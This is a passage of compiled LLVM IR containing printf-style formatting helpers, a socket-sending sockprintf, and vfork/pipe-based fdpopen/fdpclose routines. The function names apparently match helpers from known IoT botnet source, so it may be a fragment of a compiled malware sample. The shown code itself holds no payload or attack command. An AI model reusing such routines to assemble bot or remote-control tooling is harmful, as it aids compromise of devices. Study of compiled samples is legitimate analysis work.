  %85 = sub nsw i64 %indvars.iv, %16
  %86 = getelementptr inbounds i8, i8* %0, i64 %85
  store i8 %84, i8* %86, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %87 = icmp slt i64 %indvars.iv, %17
  br i1 %87, label %.critedge, label %.critedge._crit_edge.loopexit, !llvm.loop !12

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %middle.block, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %ind.end, %middle.block ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %88 = sub i64 %.019.lcssa, %indvars.iv29
  %sext33 = shl i64 %88, 32
  %89 = ashr exact i64 %sext33, 32
  %90 = getelementptr inbounds i8, i8* %0, i64 %89
  store i8 0, i8* %90, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %9 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  br label %10

; <label>:10:                                     ; preds = %138, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %138 ]
  %.0 = phi i8* [ %1, %3 ], [ %139, %138 ]
  %11 = load i8, i8* %.0, align 1
  switch i8 %11, label %134 [
    i8 0, label %140
    i8 37, label %12
  ]

; <label>:12:                                     ; preds = %10
  %13 = getelementptr inbounds i8, i8* %.0, i64 1
  %14 = load i8, i8* %13, align 1
  switch i8 %14, label %.preheader70 [
    i8 0, label %140
    i8 37, label %134
    i8 45, label %15
  ]

; <label>:15:                                     ; preds = %12
  %16 = getelementptr inbounds i8, i8* %.0, i64 2
  %.pre = load i8, i8* %16, align 1
  br label %.preheader70

.preheader70:                                     ; preds = %15, %12
  %17 = phi i8 [ %14, %12 ], [ %.pre, %15 ]
  %.063.ph = phi i32 [ 0, %12 ], [ 1, %15 ]
  %.1.ph = phi i8* [ %13, %12 ], [ %16, %15 ]
  %18 = icmp eq i8 %17, 48
  br i1 %18, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %19 = phi i8 [ %17, %.preheader70 ], [ %23, %.preheader.loopexit ]
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %22, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %21, %.preheader.loopexit ]
  %.off74 = add i8 %19, -48
  %20 = icmp ult i8 %.off74, 10
  br i1 %20, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %21, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %22, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %21 = getelementptr inbounds i8, i8* %.172, i64 1
  %22 = or i32 %.06371, 2
  %23 = load i8, i8* %21, align 1
  %24 = icmp eq i8 %23, 48
  br i1 %24, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %25 = phi i8 [ %31, %.lr.ph77 ], [ %19, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %30, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %29, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %26 = zext i8 %25 to i32
  %27 = mul nsw i32 %.06475, 10
  %28 = add i32 %27, -48
  %29 = add i32 %28, %26
  %30 = getelementptr inbounds i8, i8* %.276, i64 1
  %31 = load i8, i8* %30, align 1
  %.off = add i8 %31, -48
  %32 = icmp ult i8 %.off, 10
  br i1 %32, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %29, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %30, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %19, %.preheader ], [ %31, %.critedge.loopexit ]
  switch i8 %.lcssa, label %138 [
    i8 115, label %33
    i8 100, label %53
    i8 120, label %69
    i8 88, label %85
    i8 117, label %101
    i8 99, label %117
  ]

; <label>:33:                                     ; preds = %.critedge
  %34 = load i32, i32* %5, align 8
  %35 = icmp ult i32 %34, 41
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %33
  %37 = load i8*, i8** %6, align 8
  %38 = sext i32 %34 to i64
  %39 = getelementptr i8, i8* %37, i64 %38
  %40 = add i32 %34, 8
  store i32 %40, i32* %5, align 8
  br label %44

; <label>:41:                                     ; preds = %33
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr i8, i8* %42, i64 8
  store i8* %43, i8** %7, align 8
  br label %44

; <label>:44:                                     ; preds = %41, %36
  %.in69 = phi i8* [ %39, %36 ], [ %42, %41 ]
  %45 = bitcast i8* %.in69 to i32*
  %46 = load i32, i32* %45, align 4
  %47 = sext i32 %46 to i64
  %48 = inttoptr i64 %47 to i8*
  %49 = icmp ne i32 %46, 0
  %50 = select i1 %49, i8* %48, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i64 0, i64 0)
  %51 = tail call fastcc i32 @prints(i8** %0, i8* %50, i32 %.064.lcssa, i32 %.063.lcssa)
  %52 = add nsw i32 %51, %.061
  br label %138

; <label>:53:                                     ; preds = %.critedge
  %54 = load i32, i32* %5, align 8
  %55 = icmp ult i32 %54, 41
  br i1 %55, label %56, label %61

; <label>:56:                                     ; preds = %53
  %57 = load i8*, i8** %6, align 8
  %58 = sext i32 %54 to i64
  %59 = getelementptr i8, i8* %57, i64 %58
  %60 = add i32 %54, 8
  store i32 %60, i32* %5, align 8
  br label %64

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %7, align 8
  %63 = getelementptr i8, i8* %62, i64 8
  store i8* %63, i8** %7, align 8
  br label %64

; <label>:64:                                     ; preds = %61, %56
  %.in68 = phi i8* [ %59, %56 ], [ %62, %61 ]
  %65 = bitcast i8* %.in68 to i32*
  %66 = load i32, i32* %65, align 4
  %67 = tail call fastcc i32 @printi(i8** %0, i32 %66, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %68 = add nsw i32 %67, %.061
  br label %138

; <label>:69:                                     ; preds = %.critedge
  %70 = load i32, i32* %5, align 8
  %71 = icmp ult i32 %70, 41
  br i1 %71, label %72, label %77

; <label>:72:                                     ; preds = %69
  %73 = load i8*, i8** %6, align 8
  %74 = sext i32 %70 to i64
  %75 = getelementptr i8, i8* %73, i64 %74
  %76 = add i32 %70, 8
  store i32 %76, i32* %5, align 8
  br label %80

; <label>:77:                                     ; preds = %69
  %78 = load i8*, i8** %7, align 8
  %79 = getelementptr i8, i8* %78, i64 8
  store i8* %79, i8** %7, align 8
  br label %80

; <label>:80:                                     ; preds = %77, %72
  %.in67 = phi i8* [ %75, %72 ], [ %78, %77 ]
  %81 = bitcast i8* %.in67 to i32*
  %82 = load i32, i32* %81, align 4
  %83 = tail call fastcc i32 @printi(i8** %0, i32 %82, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %84 = add nsw i32 %83, %.061
  br label %138

; <label>:85:                                     ; preds = %.critedge
  %86 = load i32, i32* %5, align 8
  %87 = icmp ult i32 %86, 41
  br i1 %87, label %88, label %93

; <label>:88:                                     ; preds = %85
  %89 = load i8*, i8** %6, align 8
  %90 = sext i32 %86 to i64
  %91 = getelementptr i8, i8* %89, i64 %90
  %92 = add i32 %86, 8
  store i32 %92, i32* %5, align 8
  br label %96

; <label>:93:                                     ; preds = %85
  %94 = load i8*, i8** %7, align 8
  %95 = getelementptr i8, i8* %94, i64 8
  store i8* %95, i8** %7, align 8
  br label %96

; <label>:96:                                     ; preds = %93, %88
  %.in66 = phi i8* [ %91, %88 ], [ %94, %93 ]
  %97 = bitcast i8* %.in66 to i32*
  %98 = load i32, i32* %97, align 4
  %99 = tail call fastcc i32 @printi(i8** %0, i32 %98, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %100 = add nsw i32 %99, %.061
  br label %138

; <label>:101:                                    ; preds = %.critedge
  %102 = load i32, i32* %5, align 8
  %103 = icmp ult i32 %102, 41
  br i1 %103, label %104, label %109

; <label>:104:                                    ; preds = %101
  %105 = load i8*, i8** %6, align 8
  %106 = sext i32 %102 to i64
  %107 = getelementptr i8, i8* %105, i64 %106
  %108 = add i32 %102, 8
  store i32 %108, i32* %5, align 8
  br label %112

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %7, align 8
  %111 = getelementptr i8, i8* %110, i64 8
  store i8* %111, i8** %7, align 8
  br label %112

; <label>:112:                                    ; preds = %109, %104
  %.in65 = phi i8* [ %107, %104 ], [ %110, %109 ]
  %113 = bitcast i8* %.in65 to i32*
  %114 = load i32, i32* %113, align 4
  %115 = tail call fastcc i32 @printi(i8** %0, i32 %114, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %116 = add nsw i32 %115, %.061
  br label %138

; <label>:117:                                    ; preds = %.critedge
  %118 = load i32, i32* %5, align 8
  %119 = icmp ult i32 %118, 41
  br i1 %119, label %120, label %125

; <label>:120:                                    ; preds = %117
  %121 = load i8*, i8** %6, align 8
  %122 = sext i32 %118 to i64
  %123 = getelementptr i8, i8* %121, i64 %122
  %124 = add i32 %118, 8
  store i32 %124, i32* %5, align 8
  br label %128

; <label>:125:                                    ; preds = %117
  %126 = load i8*, i8** %7, align 8
  %127 = getelementptr i8, i8* %126, i64 8
  store i8* %127, i8** %7, align 8
  br label %128

; <label>:128:                                    ; preds = %125, %120
  %.in = phi i8* [ %123, %120 ], [ %126, %125 ]
  %129 = bitcast i8* %.in to i32*
  %130 = load i32, i32* %129, align 4
  %131 = trunc i32 %130 to i8
  store i8 %131, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %132 = call fastcc i32 @prints(i8** %0, i8* nonnull %8, i32 %.064.lcssa, i32 %.063.lcssa)
  %133 = add nsw i32 %132, %.061
  br label %138

; <label>:134:                                    ; preds = %12, %10
  %135 = phi i8 [ %11, %10 ], [ 37, %12 ]
  %.3 = phi i8* [ %.0, %10 ], [ %13, %12 ]
  %136 = zext i8 %135 to i32
  tail call fastcc void @printchar(i8** %0, i32 %136)
  %137 = add nsw i32 %.061, 1
  br label %138

; <label>:138:                                    ; preds = %.critedge, %134, %128, %112, %96, %80, %64, %44
  %.162 = phi i32 [ %137, %134 ], [ %52, %44 ], [ %68, %64 ], [ %84, %80 ], [ %100, %96 ], [ %116, %112 ], [ %133, %128 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %134 ], [ %.2.lcssa, %44 ], [ %.2.lcssa, %64 ], [ %.2.lcssa, %80 ], [ %.2.lcssa, %96 ], [ %.2.lcssa, %112 ], [ %.2.lcssa, %128 ], [ %.2.lcssa, %.critedge ]
  %139 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %10

; <label>:140:                                    ; preds = %12, %10
  %141 = icmp eq i8** %0, null
  br i1 %141, label %144, label %142

; <label>:142:                                    ; preds = %140
  %143 = load i8*, i8** %0, align 8
  store i8 0, i8* %143, align 1
  br label %144

; <label>:144:                                    ; preds = %140, %142
  %145 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %145)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #3
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #3
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #14
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i64 0, i64 0), i8* %5)
  %12 = call i64 @strlen(i8* %5) #14
  %13 = call i64 @send(i32 %0, i8* %5, i64 %12, i32 16384) #3
  %14 = trunc i64 %13 to i32
  call void @free(i8* %5) #3
  ret i32 %14
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8* nocapture readnone, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %77 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %77

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #3
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %77, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #3
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %77, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #3
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %77, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #15
  switch i32 %27, label %60 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #3
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #3
  br label %77

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #3
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #3
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #3
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #3
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #3
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #3
  br label %59

; <label>:59:                                     ; preds = %55, %45
  call void @_exit(i32 127) #16
  unreachable

; <label>:60:                                     ; preds = %26
  %61 = load i8, i8* %1, align 1
  %62 = icmp eq i8 %61, 114
  br i1 %62, label %63, label %68

; <label>:63:                                     ; preds = %60
  %64 = load i32, i32* %10, align 4
  %65 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %66 = load i32, i32* %65, align 4
  %67 = call i32 @close(i32 %66) #3
  br label %73

; <label>:68:                                     ; preds = %60
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = load i32, i32* %10, align 4
  %72 = call i32 @close(i32 %71) #3
  br label %73

; <label>:73:                                     ; preds = %68, %63
  %.010 = phi i32 [ %64, %63 ], [ %70, %68 ]
  %74 = load i32*, i32** @fdopen_pids, align 8
  %75 = sext i32 %.010 to i64
  %76 = getelementptr inbounds i32, i32* %74, i64 %75
  store i32 %27, i32* %76, align 4
  br label %77

; <label>:77:                                     ; preds = %19, %16, %9, %5, %2, %73, %28
  %.0 = phi i32 [ %.010, %73 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

